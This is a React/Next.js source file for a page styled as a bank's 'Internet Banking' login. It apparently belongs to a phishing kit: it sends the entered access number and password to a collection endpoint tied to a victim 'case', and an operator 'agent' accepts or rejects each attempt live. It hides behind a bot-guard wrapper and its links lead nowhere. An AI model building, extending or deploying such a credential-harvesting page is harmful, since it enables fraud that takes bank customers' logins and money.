'use client';

import { useState, useCallback, useEffect } from 'react';
import { useRouter, useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';
import { Loader2, LockKeyhole, AlertCircle } from 'lucide-react';



export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.sessionUuid as string;

  const { status, loading, error, caseId, agentMessage } = useSessionStore();

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Reset form when agent rejects submission
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setUsername('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!username.trim()) {
        setFieldError('Please enter your Access number');
        return;
      }

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: username.trim(),
            password,
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your credentials. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [username, password, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      <div className="card">
        <h1 className="card__title">Welcome</h1>
        <form className="login-form" onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="access-number" className="form-label">
              Access number
            </label>
            <input
              type="text"
              id="access-number"
              className="form-input"
              value={username}
              onChange={(e) => {
                setUsername(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isWaiting}
            />
          </div>

          <div className="form-group">
            <label htmlFor="password" className="form-label">
              Password
            </label>
            <input
              type="password"
              id="password"
              className="form-input"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isWaiting}
            />
          </div>

          {fieldError && (
            <div style={{ color: '#d32f2f', marginBottom: '16px', fontSize: '14px', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <AlertCircle className="h-4 w-4" />
              <span>{fieldError}</span>
            </div>
          )}

          {(error && !fieldError) && (
            <div style={{ color: '#d32f2f', marginBottom: '16px', fontSize: '14px', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <AlertCircle className="h-4 w-4" />
              <span>{error}</span>
            </div>
          )}

          <button type="submit" className="btn btn--primary" disabled={isWaiting}>
            {isWaiting ? (
              <>
                <Loader2 className="h-4 w-4 animate-spin" style={{ marginRight: '8px' }} />
                Logging in...
              </>
            ) : (
              <>
                Log in
                <LockKeyhole className="btn__icon h-5 w-5" />
              </>
            )}
          </button>
        </form>

        <p className="agreement-text">
          By logging in you agree to our{' '}
          <a href="#">Internet Banking terms and conditions</a> and{' '}
          <a href="#">Master Privacy Policy</a>.
        </p>
        <div className="card__footer">
          <a href="#" className="footer-link">
            Forgot your password?
          </a>
          <a href="#" className="footer-link">
            Find your Access Number
          </a>
        </div>
      </div>

      <div className="security-notice">
        <div className="security-notice__icon">
          <svg
            aria-hidden="true"
            focusable="false"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              fillRule="evenodd"
              clipRule="evenodd"
              d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V11H13V17ZM13 9H11V7H13V9Z"
              fill="#002f6b"
            />
          </svg>
        </div>
        <div className="security-notice__content">
          <p>
            We've added a new security feature. When you use Internet Banking, we
            collect information about behaviour like how you type. This helps us
            to spot any activity that isn't yours, to detect and prevent fraud.
          </p>
          <a href="#">More about this feature</a>
        </div>
      </div>

    </BotGuard>
  );
}
